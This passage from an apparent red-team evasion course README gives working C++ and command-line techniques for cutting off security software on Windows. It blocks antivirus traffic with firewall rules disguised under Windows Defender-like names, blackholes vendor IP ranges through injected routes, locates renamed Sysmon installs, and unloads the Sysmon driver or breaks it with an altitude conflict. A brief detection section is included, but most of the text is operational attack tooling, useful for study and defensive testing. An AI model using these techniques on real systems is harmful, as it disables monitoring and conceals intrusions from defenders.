2. Navigate to **Outbound Rules**
3. Look for rule named "Windows Defender Firewall Remote Management (RPC)"
4. Verify rule is enabled and blocking outbound traffic

   <img width="1683" height="821" alt="image" src="https://github.com/user-attachments/assets/89715209-317c-4537-b49a-15d51389955a" />
   <img width="1680" height="819" alt="image" src="https://github.com/user-attachments/assets/fc4df92c-f1f6-4000-a5be-1225065100cb" />


**Rule Properties Verification:**
- **Name**: Windows Defender Firewall Remote Management (RPC)
- **Group**: Windows Defender Firewall Remote Management (RPC)  
- **Action**: Block
- **Program**: C:\Program Files\Bitdefender Antivirus Free\vsserv.exe
- **Protocol**: Any
- **Direction**: Out
- **Profiles**: Domain, Private, Public

**Network Connection Observation:**
- Previously established Bitdefender connections immediately terminated
- New connection attempts from target process fail
- Process continues running but cannot communicate externally

### Step 6: Advanced IP-Based Blocking

**Uncomment Remote Address Blocking:**
```cpp
// Enable IP-based blocking in addition to application blocking
pFwRule->put_RemoteAddresses(bstrRuleRAddrs);  // "54.0.0.0/8"
```

<img width="1415" height="861" alt="image" src="https://github.com/user-attachments/assets/0bb62604-483f-4c2a-b159-3e133b892562" />

<img width="1420" height="864" alt="image" src="https://github.com/user-attachments/assets/e4d287ac-7201-4b0c-9ad1-c9880aae24da" />


**IP Blocking Strategy:**
- Block entire IP ranges used by security providers
- Use CIDR notation for network blocks
- Combine with application blocking for comprehensive coverage
- Multiple rules can target different IP ranges

<img width="1374" height="801" alt="image" src="https://github.com/user-attachments/assets/605c5a23-d7f5-4629-856d-6f2093d035d4" />

**Multiple Rule Creation:**
```cpp
// Create multiple rules for different IP ranges
BSTR bstrRuleRAddrs1 = SysAllocString(L"18.0.0.0/8");
BSTR bstrRuleRAddrs2 = SysAllocString(L"54.0.0.0/8");
BSTR bstrRuleRAddrs3 = SysAllocString(L"52.0.0.0/8");

// Create separate rules for each IP range
// Each rule blocks the target application to specific IP ranges
```

<img width="1679" height="820" alt="image" src="https://github.com/user-attachments/assets/aefd9d39-1532-4f26-87f6-7b8722b747c2" />

<img width="806" height="80" alt="image" src="https://github.com/user-attachments/assets/8dba56fa-e9d9-429b-bb08-b92098be023f" />

<img width="813" height="115" alt="image" src="https://github.com/user-attachments/assets/cd3a8714-4f40-453e-8f0a-1c2b1877c01c" />

## Technical Deep Dive

### Step 7: Firewall Rule Priority and Evaluation

**Rule Processing Order:**
1. Windows evaluates rules from most specific to least specific
2. Application-specific rules take precedence over general rules
3. First matching rule determines the action
4. Default action (allow/block) applies if no rules match

**Rule Specificity:**
- Application + Remote IP: Most specific
- Application only: Medium specificity  
- Remote IP only: Less specific
- General rules: Least specific

### Step 8: Stealth Considerations

**Rule Naming Strategies:**
```cpp
// Legitimate-sounding rule names
BSTR bstrRuleName = SysAllocString(L"Windows Defender Advanced Threat Protection");
BSTR bstrRuleName = SysAllocString(L"Microsoft Security Client Network Inspection");
BSTR bstrRuleName = SysAllocString(L"System Guard Runtime Monitor Broker");
```

**Grouping for Organization:**
- Use existing group names when possible
- Create groups that appear to be system components
- Avoid suspicious or custom group names

### Step 9: Error Handling and Reliability

**Enhanced Error Checking:**
```cpp
// Check if rule already exists before adding
HRESULT hrAdd = pFwRules->Add(pFwRule);
if (hrAdd == FWP_E_ALREADY_EXISTS) {
    printf("Firewall rule already exists\n");
    // Handle duplicate rule scenario
} else if (FAILED(hrAdd)) {
    printf("Firewall Rule Add failed: 0x%08lx\n", hrAdd);
    goto Cleanup;
}
```

**Rule Existence Verification:**
```cpp
// Verify rule was added successfully
INetFwRule *pVerifiedRule = NULL;
HRESULT hrGet = pFwRules->Item(bstrRuleName, &pVerifiedRule);
if (SUCCEEDED(hrGet)) {
    printf("Rule successfully added and verified\n");
    pVerifiedRule->Release();
}
```

## Detection and Mitigation

### Detection Opportunities

**Behavioral Indicators:**
- Programmatic firewall rule creation
- Rules blocking security agent communications
- Multiple rules targeting same application with different IP ranges
- Rules with suspicious names or descriptions

**Forensic Artifacts:**
- Windows Firewall event logs (Event ID 2004, 2005, 2006)
- COM activation events for firewall interfaces
- Rule creation timestamps in firewall configuration

### Defensive Strategies

**Firewall Monitoring:**
```cpp
// EDRs can monitor for suspicious firewall rule creation
BOOL MonitorFirewallRules() {
    // Track rule creation patterns
    // Alert on rules blocking security processes
    // Monitor for rules with suspicious names
    return IsSuspiciousFirewallActivity();
}
```

**Rule Integrity Checking:**
- Regular scanning of firewall rules
- Baseline comparison of rule sets
- Alerting on rules that block security services

## Building the Project

### Prerequisites
- Visual Studio 2019 or later
- Windows SDK
- Administrator privileges for testing

### Compilation
```batch
cd 03.BlockingEPPComms-Firewall
compile.bat
```

### Required Libraries and Headers
```cpp
#include <windows.h>
#include <stdio.h>
#include <netfw.h>  // Windows Firewall interfaces

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
```

## Operational Considerations

### Privilege Requirements
- **Local Administrator**: Required for firewall rule modification
- **No SYSTEM Required**: Standard admin privileges sufficient
- **UAC Bypass**: May be needed in some environments

### Persistence and Maintenance
- Firewall rules persist across reboots
- Rules remain active until explicitly removed
- Multiple rules can be created for comprehensive blocking
- Rules should be cleaned up after operation completion

## References

- Microsoft Docs: Windows Firewall with Advanced Security
- MSDN: INetFwPolicy2 Interface
- MSDN: INetFwRule Interface
- MITRE ATT&CK: T1562.004 (Impair Defenses: Disable or Modify System Firewall)


      
</details>


<details>
<summary>04 - Blocking EPP Comms-Routing Table(P1)</summary>

[03.Local-admin/02.EPP-comms/03.netblk-printroute](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/02.EPP-comms/03.netblk-printroute)


A C++ implementation for programmatically retrieving and displaying the Windows IP routing table using the IP Helper API.

## Overview

This tool demonstrates how to access Windows routing table information directly through the Windows API rather than using command-line utilities like `route print`. It provides a programmatic approach to enumerate all routing table entries, including destination IPs, subnet masks, next hops, interface indices, route types, and protocols.

## Prerequisites

Before examining the routing table programmatically, you can view it using the built-in Windows command-line tool:

```cmd
route print

# we could also use a quick command
wmic path Win32_ip4routetable get

# or for the full command
wmic /namespace\\root\cimv2 path win32_ip4routetable get
```

<img width="1091" height="671" alt="image" src="https://github.com/user-attachments/assets/33fdcd4c-fc4e-4b49-8b5d-20469e28abf3" />

<img width="1285" height="649" alt="image" src="https://github.com/user-attachments/assets/24968d2d-9507-4954-a483-ef9d9b813cb1" />


This command displays the complete routing table, but our implementation provides the same information through direct API calls for integration into larger applications. We don't want to use command line tools so we will utilise some code. 

## Technical Details

### Approach
The implementation uses the IP Helper API (`iphlpapi.dll`) to retrieve the routing table information. This method is more efficient than WMI for this specific use case and provides direct access to the system's routing data.

### Key Features
- Retrieves the complete IP forwarding table
- Handles dynamic memory allocation for routing table data
- Converts IP addresses to human-readable format
- Translates route types and protocols from numeric values to descriptive text
- Displays comprehensive routing information including metrics and age

## Code Implementation

### Dependencies
- `iphlpapi.lib` - IP Helper API library
- `ws2_32.lib` - Winsock library for IP address conversion

### Core Functionality

```cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
```

### Memory Management
The code uses a two-step allocation process:
1. Initial allocation of a standard-sized buffer
2. Reallocation based on the actual size required if the initial buffer is insufficient

### Routing Table Retrieval Process

1. **Initial Allocation**: Allocate memory for the routing table structure
2. **Size Check**: Attempt to retrieve the table, which may return an insufficient buffer error with the required size
3. **Proper Allocation**: Reallocate memory with the correct size
4. **Data Retrieval**: Successfully retrieve the complete routing table
5. **Enumeration**: Iterate through all routing table entries and extract information

### Data Extraction
For each routing table entry, the following information is extracted and displayed:

- **Destination IP**: The target network destination
- **Subnet Mask**: The network mask for the route
- **Next Hop**: The gateway address for the route
- **Interface Index**: The network interface associated with the route
- **Route Type**: Local vs remote routes with descriptive labels
- **Protocol**: The routing protocol used to create the entry
- **Age**: How long the route has been active
- **Metric**: The cost metric for route selection

## Building and Usage

### Compilation
Compile with a Windows C++ compiler that supports the Windows API:

```bash
cl implant.cpp
```

### Execution
Run the compiled executable without requiring elevated privileges:

```bash
./implant.exe
```

The program will output the complete routing table in a formatted, readable structure, providing the same information as `route print` but through programmatic access.

<img width="1682" height="820" alt="image" src="https://github.com/user-attachments/assets/e357a894-5289-4880-982c-73464e9a1c12" />

## Use Cases

- Network troubleshooting and analysis
- Security auditing of system routing configurations
- Educational purposes for understanding Windows networking internals
- Foundation for more advanced network manipulation tools
- Integration into larger security or network management applications

## Technical Notes

- The implementation uses `GetIpForwardTable` from the IP Helper API
- IP address conversion is handled through `inet_ntoa`
- Route types and protocols are mapped to human-readable descriptions
- Memory is properly managed using heap allocation functions
- No special privileges required for execution

This tool serves as a building block for more advanced network security and administration utilities that require programmatic access to Windows routing information, going beyond what's available through simple command-line tools like `route print`.

      
</details>


<details>
<summary>05 - Blocking EPP Comms-Routing Table(P2)</summary>

[03.Local-admin/02.EPP-comms/04.netblk-route](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/02.EPP-comms/04.netblk-route)

# Windows Routing Table Manipulation

A C++ implementation for programmatically manipulating the Windows IP routing table to block network communications by injecting blackhole routes.

## Overview

This tool demonstrates how to programmatically modify the Windows routing table to disrupt network connectivity to specific targets. By injecting custom routes that redirect traffic to invalid destinations, it can effectively block communication with specific IP addresses or entire subnets.

## Prerequisites

- Administrator privileges are required to modify the routing table
- Understanding of IP addressing and subnet masks
- Careful planning to avoid disrupting essential network services

## Technical Details

### Approach
The implementation uses the `CreateIpForwardEntry` function from the IP Helper API to add new routes to the system's routing table. By creating routes that point to bogus next-hop addresses through the loopback interface, traffic can be effectively blackholed.

### Key Features
- Programmatic route injection without command-line tools
- Support for both unicast and subnet blocking
- Configurable destination IPs and subnet masks
- Stealthy network disruption at the routing level

## Code Implementation

### Dependencies
- `iphlpapi.lib` - IP Helper API library
- `ws2_32.lib` - Winsock library

### IP Address Conversion Macro

```cpp
#define IPCONV(a,b,c,d) ((a) | ((b)&0xff)<<8 | ((c)&0xff)<<16 | ((d)&0xff)<<24)
```

This macro converts dotted-decimal IP notation to the DWORD format required by the Windows API, handling the little-endian byte ordering automatically.

### Core Functionality

```cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
```

### Route Configuration Structure

The `MIB_IPFORWARDROW` structure contains the following critical fields:

- **dwForwardDest**: Destination IP address to block
- **dwForwardMask**: Subnet mask defining the scope of blocking
- **dwForwardNextHop**: Bogus gateway address for blackholing
- **dwForwardIfIndex**: Network interface index (1 = loopback)
- **dwForwardProto**: Routing protocol (MIB_IPPROTO_NETMGMT for static routes)

## Usage Examples

### Blocking a Single IP Address

```cpp
// Block Google DNS (8.8.8.8)
pRow->dwForwardDest = (DWORD) IPCONV(8,8,8,8);
pRow->dwForwardMask = 0xFFFFFFFF;  // 255.255.255.255 - unicast
pRow->dwForwardNextHop = (DWORD) IPCONV(10,2,2,20);  // Bogus gateway
```

### Blocking Entire Subnets

```cpp
// Block entire 52.0.0.0/8 subnet
pRow->dwForwardDest = (DWORD) IPCONV(52,0,0,0);
pRow->dwForwardMask = 0x000000FF;  // 255.0.0.0 - /8 subnet

// Block 54.0.0.0/16 subnet
pRow->dwForwardDest = (DWORD) IPCONV(54,0,0,0);
pRow->dwForwardMask = 0x0000FFFF;  // 255.255.0.0 - /16 subnet
```

<img width="1468" height="822" alt="image" src="https://github.com/user-attachments/assets/feb2a553-3fe0-4185-9f49-c2a2b8a3450e" />

<img width="1474" height="823" alt="image" src="https://github.com/user-attachments/assets/86eee672-67af-4d40-9dce-7a4066267c70" />



## Building and Execution

<img width="1285" height="625" alt="image" src="https://github.com/user-attachments/assets/6864b0bf-523c-4840-b180-7d289f1d8496" />


### Compilation
```bash
cl implant.cpp
```

### Execution
Run with administrator privileges:
```bash
implant.exe
```

<img width="871" height="670" alt="image" src="https://github.com/user-attachments/assets/fc02ffd6-5404-4ed3-afd7-f61c4304d78d" />

<img width="1139" height="674" alt="image" src="https://github.com/user-attachments/assets/5eeebb99-ca83-4127-bfb7-f7e510ba39cc" />


## Operational Considerations

### Security Implications
- **Administrator Rights Required**: Route modification requires elevated privileges
- **Persistence**: Routes remain active until system reboot or manual removal
- **Stealth Advantage**: Routing table changes are less monitored than firewall rules

### Risk Mitigation
1. **Test Carefully**: Always test in controlled environments first
2. **Avoid Self-Disruption**: Don't block DNS servers or gateways critical for your own connectivity
3. **Have Recovery Plan**: Know how to remove routes manually if needed
4. **Monitor Effects**: Use tools like Wireshark to verify the impact

### Manual Route Removal
If routes need to be removed manually, use the command line:
```cmd
route delete 8.8.8.8
```

## Use Cases

- Security research and red team operations
- Network isolation and segmentation testing
- Studying Windows networking internals
- Controlled environment testing of network-dependent applications

## Technical Notes

- Routes are non-persistent and will be cleared on reboot
- The loopback interface (index 1) is used to create a local blackhole
- Bogus next-hop addresses should be within unroutable IP space
- Multiple routes can be added to block different targets
- Existing connections may take time to timeout after route injection

      
</details>




<details>
<summary>06 - Dancing with Sysmon-Detection</summary>

[03.Local-admin/03.Sysmon/01.FindSysmon/implant.cpp](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/blob/main/Files%20Windows%20Evasion/03.Local-admin/03.Sysmon/01.FindSysmon/implant.cpp)


A comprehensive C++ implementation for detecting Sysmon (System Monitor) installations on Windows systems through multiple detection methodologies.

## Overview

This toolkit provides programmatic methods to identify the presence of Sysmon, a popular system monitoring tool often used by blue teams. The implementation uses various Windows APIs to detect Sysmon through processes, services, registry artifacts, ETW providers, and minifilter drivers, revealing where Sysmon hides in the system.

## Step-by-Step Detection Methodology

### Step 1: Initial Process and Service Checks

First, check for obvious Sysmon processes and services:

```powershell
# Check for Sysmon process
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }

# Check for Sysmon service by description
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"

# Check for services with "sysm" in display name
Get-Service | where-object {$_.DisplayName -like "*sysm*"}
```

### Step 2: Sysinternals EULA Check

Check if Sysmon's EULA has been accepted in the registry:
```cmd
reg query "HKCU\Software\Sysinternals\System Monitor"
```

### Step 3: ETW Provider Enumeration

Query ETW providers for Sysmon-related entries:
```cmd
logman query providers | findstr /i sysm
```

### Step 4: Registry-Based Detection (Most Reliable)

#### Check Event Log Channels
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
```

This reveals the `OwningPublisher` GUID, which is crucial for further detection.

#### Query Publisher Information
Using the GUID found above:
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
```

<img width="1230" height="643" alt="image" src="https://github.com/user-attachments/assets/5e96c452-8b69-4a6d-88dd-5d280ede54a8" />

This provides three key pieces of information:
- Whether Sysmon is enabled
- The path to the binary
- The provider name

### Step 5: Process Identification

Use Logman to query the specific provider and get the Process ID:
```cmd
logman query providers {5770385F-C22A-43E0-BF4C-06F5698FFBD9}
```

<img width="1228" height="645" alt="image" src="https://github.com/user-attachments/assets/0e86aed5-a970-4fbf-85f7-aea280752cca" />

This returns the PID of the Sysmon service. For example, if it returns PID 2692:

```cmd
tasklist | findstr 2692
```

<img width="1225" height="643" alt="image" src="https://github.com/user-attachments/assets/73989c59-7e7f-4844-b7e9-71528018a853" />


This reveals the actual process name, which might be disguised (e.g., `onedrv.exe` instead of `Sysmon.exe`).

<img width="1233" height="641" alt="image" src="https://github.com/user-attachments/assets/927f2bc2-2040-4a9b-b949-eaee1db3195a" />


### Step 6: Service Configuration Discovery

```batch
# verify
C:\Windows\onedrv.exe /?
```

<img width="1228" height="641" alt="image" src="https://github.com/user-attachments/assets/b3502a53-943c-4be4-bf16-488b4fda1f79" />

Once you have the service name from the process discovery, query its parameters:

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\onedrv\Parameters"
```

This reveals the name of the Sysmon driver, completing the picture of where Sysmon is hiding.

<img width="1265" height="156" alt="image" src="https://github.com/user-attachments/assets/212aea76-0a2f-4f71-bab1-7a6078ac1fdc" />

### Step 7: Administrative Detection (Minifilter Drivers)

With administrative privileges, enumerate minifilter drivers:
```cmd
fltmc
fltmc instances
```

Look for Sysmon-related entries in the minifilter list. The default Sysmon altitude is 385201, but this can be changed.

As you can see, there's no `onedrv` driver here, but as `ofltdrv`:

<img width="1267" height="676" alt="image" src="https://github.com/user-attachments/assets/f7536316-ab9d-490b-ba38-fa937901d516" />


## Understanding Minifilter Altitudes

Minifilter drivers are organized in a chain with specific "altitudes" that determine their position in the I/O processing stack:

- **What are altitudes?** Positions in the driver chain that process IRP (I/O Request Packet) packets
- **How they work:** Each driver in the chain receives I/O requests, processes them, and passes them to the next driver
- **Sysmon's altitude:** Default is 385201, but this can be changed during installation
- **Importance:** Reveals where Sysmon hides in the kernel to monitor file system activity

## Code Implementation

### Dependencies
- `tdh.lib` - Trace Data Helper library
- `Ole32.lib` - COM services
- `Advapi32.lib` - Registry and security functions
- `OleAut32.lib` - OLE automation

### Core Detection Flow

#### Main Function
```cpp
int main(void) {
    // Step 1: Check Sysmon event channel registry key
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
    
    // Step 2: Extract owning publisher GUID
    // Step 3: Search for matching ETW provider using TdhEnumerateProviders
    // Step 4: Identify associated processes and services
    // Step 5: Reveal all hiding places
}
```

#### ETW Provider Enumeration
```cpp
int FindSysmon(wchar_t * guid) {
    // Use TdhEnumerateProviders to list all ETW providers
    // Buffer size management with reallocation
    // Compare each provider GUID against Sysmon's GUID
    // Return detailed provider information
}
```

#### Process Identification via COM
```cpp
int PrintSysmonPID(wchar_t * guid) {
    // Initialize COM for performance logs and alerts
    // Query ITraceDataProvider interface
    // Get registered processes for Sysmon provider
    // Extract PIDs using IValueMap enumerator
}
```

#### Process Name Resolution
```cpp
char * FindProcName(int pid) {
    // Create toolhelp snapshot of all processes
    // Iterate through PROCESSENTRY32 structures
    // Match PID to find executable name
    // Return actual process name even if disguised
}
```

## Building and Usage

### Compilation
```bash
cl implant.cpp
```

### Execution
Run the compiled executable:
```bash
implant.exe
```

The tool automates all detection steps and reveals:
- ETW provider information and GUID
- Process ID and actual process name
- Service configuration details
- Registry artifacts
  <img width="1411" height="860" alt="image" src="https://github.com/user-attachments/assets/af7fbfef-cf22-49c0-a77d-b90b10181b81" />
  
- Minifilter driver information (with admin privileges)
  [03.Local-admin/03.Sysmon/02.ListMiniflt](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/03.Sysmon/02.ListMiniflt)
  <img width="1570" height="821" alt="image" src="https://github.com/user-attachments/assets/6ccd29b9-82e3-440b-9d41-05bc157aa018" />

## Advanced Detection Techniques

### Manual Verification Steps

1. **Cross-reference PIDs:**
   ```cmd
   tasklist /svc | findstr "PID_from_logman"
   ```

2. **Check service dependencies:**
   ```cmd
   sc queryex [service_name]
   ```

3. **Verify driver files:**
   ```cmd
   driverquery | findstr "sysmon"
   ```

### Event Log Verification
Open Event Viewer and navigate to:
```
Applications and Services Logs > Microsoft > Windows > OneDrv > Microsoft-Windows-Sysmon/Operational
```

<img width="1683" height="820" alt="image" src="https://github.com/user-attachments/assets/ca1f9bbb-8ab9-4b43-8e8f-6ce5658d4d41" />


This provides visual confirmation of Sysmon's presence and activity.

## Detection Evasion Considerations

Sysmon can be hidden through various methods:
- **Renamed binaries:** The executable and driver names can be changed
- **Modified GUIDs:** Provider GUIDs can be altered in custom installations
- **Changed altitudes:** Minifilter altitude can be different from default
- **Registry modifications:** Keys can be moved or renamed

However, the event channel name `Microsoft-Windows-Sysmon/Operational` is one of the most persistent and difficult artifacts to change completely.

## Output Interpretation

The tool provides comprehensive output showing:
- **Provider Detection:** Name, GUID, and status
- **Process Information:** PID and actual executable name
- **Service Details:** Configuration parameters and driver names
- **Kernel Components:** Minifilter driver information (with admin rights)
- **Confidence Level:** Based on multiple detection vectors

## Important Notes

- **Privilege Requirements:** Some detection methods require administrative privileges
- **Multiple Techniques:** Always use multiple detection methods for reliable results
- **Custom Configurations:** Be aware that customized Sysmon installations may evade some detection methods
- **Persistence:** The event log channel remains the most reliable indicator
- **Testing:** Always validate detection methods in controlled environments

This toolkit implements a comprehensive, step-by-step approach to detecting Sysmon installations, following the exact methodology demonstrated in the technical walkthrough. It uncovers Sysmon regardless of where it tries to hide in the system architecture.
</details>




<details>
<summary>07 - Dancing with Sysmon-Killem</summary>

[03.Local-admin/03.Sysmon/03.UnloadFlt](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/03.Sysmon/03.UnloadFlt)

A comprehensive guide to disabling or evading Sysmon monitoring through various techniques, depending on your privilege level on the target system.

## Overview

This toolkit provides methods to neutralize Sysmon monitoring capabilities through multiple approaches, from configuration manipulation to driver unloading and altitude conflicts. The techniques vary based on whether you have regular user privileges or local administrator access.

## Step-by-Step Neutralization Methods

### Step 1: Assess Your Privilege Level

**Regular User:**
- Limited options available
- Focus on reconnaissance and finding misconfigurations
- Search for Sysmon configuration files left accessible on disk

**Local Administrator:**
- Full range of neutralization techniques available
- Can manipulate services, drivers, and configurations
- Sysmon is not hardened against "rogue admin" attacks

### Step 2: Administrative Techniques - Extract Current Configuration

#### Method A: Using Sysmon Binary
Locate and query the Sysmon binary directly:

```cmd
# Use the discovered Sysmon binary (often renamed from Sysmon.exe)
onedrv.exe -c
```

<img width="1285" height="651" alt="image" src="https://github.com/user-attachments/assets/252a8fb8-bf82-4f5d-967e-d40317a460f5" />

This command outputs comprehensive information including:
- **Service name**
- **Driver name** 
- **Config file path** (e.g., `C:\RTO\Tools\swift.xml`)
- Current rule sets and configuration status

#### Method B: Registry Query (Critical Step)
**Extract configuration directly from the driver service registry key:**

```cmd
# Query the driver parameters for configuration and rules
reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters"
```

<img width="1225" height="641" alt="image" src="https://github.com/user-attachments/assets/a53c0046-32d5-431b-8a34-252ba5575a57" />

```cmd

```

<img width="1283" height="629" alt="image" src="https://github.com/user-attachments/assets/981f874b-c790-4581-9c0b-3c05582768a5" />

**Expected Output:**
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters
    ConfigFile    REG_SZ    C:\RTO\Tools\swift.xml
    Rules    REG_BINARY    [binary data]
    SysmonImagePath    REG_SZ    C:\Windows\onedrv.exe
```

#### Extract Specific Values
```cmd
# Get just the configuration file path
reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters" /v ConfigFile

# Get the compiled rules binary data  
reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters" /v Rules
```

**Key Points:**
- **ConfigFile**: Shows the exact path to the active XML configuration (`C:\RTO\Tools\swift.xml`)
- **Rules**: Contains the REG_BINARY compiled version of the current filtering rules
- This registry key gives the same information as `onedrv.exe -c` but through direct registry access

#### Method C: Service-Based Query
You can also query the service parameters:
```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\onedrv\Parameters"
```

This may provide additional service-specific configuration details.

### Step 3: Analyze the Configuration File

#### Open and Examine the Configuration
Using the path discovered from either method, open the configuration file:

```cmd
# Open with Notepad++ or preferred editor
notepad++ C:\RTO\Tools\swift.xml
```

Or with native Windows editor:
```cmd
notepad C:\RTO\Tools\swift.xml
```


<img width="1612" height="797" alt="image" src="https://github.com/user-attachments/assets/7d255df8-88db-4d85-84aa-6ffef7868f88" />

<img width="1611" height="805" alt="image" src="https://github.com/user-attachments/assets/ab3610f8-ec89-4460-bb7c-f40cf22f9e9c" />

#### Configuration Analysis Points
When examining the SwiftOnSecurity configuration or similar:

**Look for monitoring gaps:**
- Overly broad exclusion rules
- Missing process creation events
- Network connection exceptions
- File extension exclusions
- Path-based whitelists

**Common blind spots to exploit:**
- Default Windows directories
- Temporary folder exclusions
- Common administrative tool exceptions
- Script interpreter exemptions

### Step 4: Regular User Reconnaissance

#### Hunt for Accessible Configuration Files
If you don't have admin rights, search for accessible Sysmon configuration files:
```cmd
dir C:\*.xml /s
dir C:\Windows\*.xml /s
dir C:\ProgramData\*.xml /s
dir C:\RTO\Tools\*.xml /s
```

#### Registry Analysis Without Admin Rights
Some registry information may be readable by standard users:
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers" /s | findstr "Sysmon"
```

### Step 5: Configuration Manipulation

#### Load Permissive Configuration
Replace the current configuration with a permissive one that excludes all monitoring:
```cmd
# Load an empty or permissive configuration
onedrv.exe -c empty_config.xml
```

#### Create Permissive Configuration
Create a configuration file that excludes most monitoring:
```xml
<Sysmon schemaversion="4.70">
  <HashAlgorithms>SHA256</HashAlgorithms>
  <EventFiltering>
    <!-- Minimal or no rules to reduce logging -->
    <RuleGroup groupRelation="or">
      <!-- Add permissive rules here -->
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Note:** Configuration changes are logged if the current rules monitor configuration modifications.

### Step 6: Driver Unloading (Immediate Effect)

#### Manual Method using FLTMC
```cmd
# List all minifilter drivers
fltmc

```cmd
# or by using
fltmc instances
```

<img width="1288" height="646" alt="image" src="https://github.com/user-attachments/assets/77b131b0-18e0-4f5d-9504-f1a3a13d698a" />

<img width="1284" height="667" alt="image" src="https://github.com/user-attachments/assets/380927da-8f7b-4bf8-a778-75eb3b4bf0e3" />

```cmd
# Unload Sysmon driver (using driver name from registry query)
fltmc unload ofltdrv
```

So the only thing you need is the name of the driver and you can unload that. But we can use our code from `implant.cpp`, which does exactly the same. And this code is super simple because there is only one call you have to do. It's a filter unload function with the name of the driver. And with that, the driver gets unloaded from the kernel space. 

The only thing you need, apart from high privileges, you have to enable load driver privilege. It's not on by default in processes, so `setPrivilege` function does that.

<img width="1678" height="815" alt="image" src="https://github.com/user-attachments/assets/e11dff9c-2ca3-4c4c-b475-bffd7e555eb1" />


#### Programmatic Method
The provided C++ code uses the Filter Management API to unload the Sysmon driver:

**Key Requirements:**
- Administrative privileges
- SE_LOAD_DRIVER_NAME privilege enabled

**Code Implementation:**
```cpp
#include <windows.h>
#include <stdio.h>
#include <fltuser.h>

#pragma comment(lib, "FltLib.lib")
#pragma comment(lib, "Advapi32.lib")

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf("OpenProcessToken() failed!\n");
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main() {
    // Enable load driver privilege
    if (!SetPrivilege(SE_LOAD_DRIVER_NAME, ENABLE))
        return -1;
    
    // Unload the Sysmon driver (using driver name from discovery)
    HRESULT hres = FilterUnload(L"ofltdrv");
    if (hres == S_OK)
        printf("Sysmon driver unloaded successfully\n");
    else
        printf("Unload failed: 0x%x\n", hres);
    
    return 0;
}
```

**Important Notes:**
- This only unloads the kernel minifilter driver
- The Sysmon service continues running
- DNS events via ETW providers still get logged
- Requires the SE_LOAD_DRIVER_NAME privilege

### Step 7: Verify Unload Effectiveness

#### Check Minifilter Status
```cmd
fltmc instances | findstr "ofltdrv"
```

#### Monitor Sysmon Logs
Check Event Viewer for error messages:
```
Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
```

Look for error events indicating driver communication failures.

### Step 8: Understand ETW Provider Persistence

Even after driver unloading, some events continue via ETW providers:

#### Identify Registered Providers
```cmd
logman query providers | findstr "1DRV"
```

#### Check DNS Client Provider
```cmd
logman query providers microsoft-windows-dns-client
```

<img width="1288" height="651" alt="image" src="https://github.com/user-attachments/assets/5091fd63-57f2-42fd-875f-c53b86885116" />

The Sysmon service remains registered to the DNS client ETW provider, so DNS queries continue to be logged even after the minifilter is unloaded.

### Step 9: Altitude Conflict Attack (Requires Reboot)

#### Understanding Minifilter Altitudes
- Altitudes determine driver position in the I/O processing stack
- Each minifilter has a unique altitude number
- Conflicts occur when two drivers share the same altitude
- Microsoft manages altitude allocations to prevent conflicts

#### Manual Altitude Modification
```cmd
# Check current altitude
reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude

# Change to conflict with Bitdefender driver (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude /t REG_SZ /d 320832 /f

# Revert to original altitude
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude /t REG_SZ /d 320833 /f
```

